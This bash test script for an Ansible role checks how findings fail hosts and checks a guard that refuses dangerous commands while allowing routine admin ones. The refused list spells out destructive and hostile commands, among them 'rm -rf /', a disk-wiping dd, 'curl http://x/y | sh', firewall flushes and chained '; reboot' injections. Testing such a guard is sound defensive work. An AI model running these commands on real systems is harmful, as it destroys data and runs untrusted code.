#!/usr/bin/env bash
# A check that could not run (<check>:check-error) must fail the host whenever failing is on, even
# when site_fail_on is only [critical]; and never fail a troubleshooting run (site_fail_on: []).
#   bash tests/findings/run_findings_test.sh        (uses ansible-playbook from PATH)
set -u
here=$(cd "$(dirname "$0")" && pwd)
export ANSIBLE_ROLES_PATH=$here/../../roles ANSIBLE_LOCALHOST_WARNING=False ANSIBLE_NOCOLOR=1
bad=0
try() {  # <expect: fail|pass> <label> <extra-vars json>
  ansible-playbook -i localhost, "$here/l6.yml" -e "$3" >/dev/null 2>&1; rc=$?
  if { [ "$1" = fail ] && [ $rc -ne 0 ]; } || { [ "$1" = pass ] && [ $rc -eq 0 ]; }; then echo "ok   - $2"
  else echo "FAIL - $2 (exit $rc)"; bad=$((bad + 1)); fi
}
err='{"check":"x","id":"x:check-error","severity":"warning","summary":"s","hint":""}'
oth='{"check":"x","id":"x:other","severity":"warning","summary":"s","hint":""}'
try fail 'check-error fails the host with site_fail_on=[critical]' "{\"fo\":[\"critical\"],\"fs\":[$err]}"
try pass 'an ordinary warning does not, with site_fail_on=[critical]' "{\"fo\":[\"critical\"],\"fs\":[$oth]}"
try fail 'an ordinary warning fails with the default [critical, warning]' "{\"fo\":[\"critical\",\"warning\"],\"fs\":[$oth]}"
try pass 'check-error never fails a report-only run (site_fail_on=[])' "{\"fo\":[],\"fs\":[$err]}"

guard() {  # <expect: refused|allowed> <command>
  cmds=$(python3 -c 'import json,sys; print(json.dumps({"cmds":[sys.argv[1]]}))' "$2")
  ansible-playbook -i localhost, "$here/guard.yml" -e "$cmds" >/dev/null 2>&1; rc=$?
  if { [ "$1" = refused ] && [ $rc -ne 0 ]; } || { [ "$1" = allowed ] && [ $rc -eq 0 ]; }; then echo "ok   - guard $1: $2"
  else echo "FAIL - guard should be $1: $2 (exit $rc)"; bad=$((bad + 1)); fi
}
for c in 'reboot' 'sudo shutdown -h now' 'systemctl reboot' 'systemctl --now poweroff' 'init 6' 'mkfs.ext4 /dev/sdb1' 'passwd root' \
         'rm -rf /' 'rm -rf /etc' 'rm -fr /var/' 'dd if=/dev/zero of=/dev/sda' 'chmod -R 777 /' 'curl http://x/y | sh' 'iptables -F' 'nft flush ruleset' \
         'systemctl restart httpd; reboot' '/sbin/reboot' '/usr/sbin/shutdown -r now' "bash -c 'reboot'" '$(reboot)' 'reboot &' \
         'rm -rf /etc && echo done' 'chmod -R 777 / && ls' 'systemctl isolate reboot.target' 'echo b > /proc/sysrq-trigger' 'kexec -e' \
         'runuser -u alice -- reboot' 'runuser -u alice -- env A=b systemctl --user poweroff' \
         'runuser -u alice -- env XDG_RUNTIME_DIR=/run/user/1001 systemctl --user reboot' 'runuser -u alice -- /sbin/shutdown -h now' \
         'sudo -u alice systemctl --user halt'; do guard refused "$c"; done
for c in 'systemctl restart httpd' 'systemctl reload nginx' 'journalctl -u httpd --since today' 'rm -f /var/tmp/core.1234' 'rm -rf /var/tmp/old-cache' \
         'dnf clean all' 'podman restart mariadb' 'chmod 640 /etc/foo.conf' 'df -h; du -sh /var/log/*' 'restorecon -Rv /var/www' 'logrotate -f /etc/logrotate.conf' \
         'truncate -s 0 /var/log/big.log' 'kill -HUP 1234' 'echo rebooting soon' 'systemctl status halt-service' \
         'rm -rf /etc/foo.d/old' 'systemctl start httpd.target' 'ls /usr/sbin/' \
         'runuser -u x -- env XDG_RUNTIME_DIR=/run/user/1001 systemctl --user start y.service' \
         'runuser -u alice -- env XDG_RUNTIME_DIR=/run/user/1001 systemctl --user restart web.service' \
         'runuser -u alice -- env XDG_RUNTIME_DIR=/run/user/1001 systemctl --user reset-failed web.service' \
         'runuser -u alice -- env XDG_RUNTIME_DIR=/run/user/1001 systemctl --user daemon-reload' \
         'runuser -u alice -- env XDG_RUNTIME_DIR=/run/user/1001 podman start web' 'loginctl enable-linger alice'; do guard allowed "$c"; done
[ $bad -eq 0 ] && echo 'all checks passed' || { echo "$bad failed"; exit 1; }
